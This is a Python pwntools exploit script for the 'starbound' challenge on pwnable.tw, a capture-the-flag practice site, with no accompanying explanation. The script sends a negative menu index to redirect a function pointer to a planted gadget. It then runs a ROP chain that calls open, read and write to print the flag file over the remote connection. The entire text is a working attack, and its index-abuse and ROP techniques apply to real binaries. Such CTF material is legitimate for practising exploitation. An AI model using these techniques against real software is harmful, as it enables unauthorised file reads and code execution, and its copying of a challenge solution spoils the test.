from pwn import *
elf=ELF('./starbound')
locdbg=False
context.log_level='debug'
if locdbg:
    p=process('./starbound')
else:
    p=remote('chall.pwnable.tw',10202)

def slp():
    if not locdbg:
        sleep(0.5)

def pwndbg():
    if locdbg:
        gdb.attach(p)


name_addr=0x080580d0
func_list=0x08058154
add_esp_ret=0x08048e48 #add 0x1c
bss_addr=0x08057d40



p.recvuntil(b'> ')
p.send(b'6')
slp()

p.recvuntil(b'> ')
p.send(b'2')
slp()

p.recvuntil(b'name: ')
p.send(p32(add_esp_ret)+b'/home/starbound/flag\0')
slp()

#pwndbg()
p.recvuntil(b'> ')
payload=b'-33\0'+b'0'*0x4+p32(elf.plt['open'])+p32(add_esp_ret)+p32(name_addr+0x4)+p32(0)+p32(0)
payload+=b'0'*0x10
payload+=p32(elf.plt['read'])+p32(add_esp_ret)+p32(3)+p32(name_addr)+p32(100)
payload+=b'0'*0x10
payload+=p32(elf.plt['write'])+p32(elf.symbols['main'])+p32(1)+p32(name_addr)+p32(100)

p.send(payload)

print(p.recv())
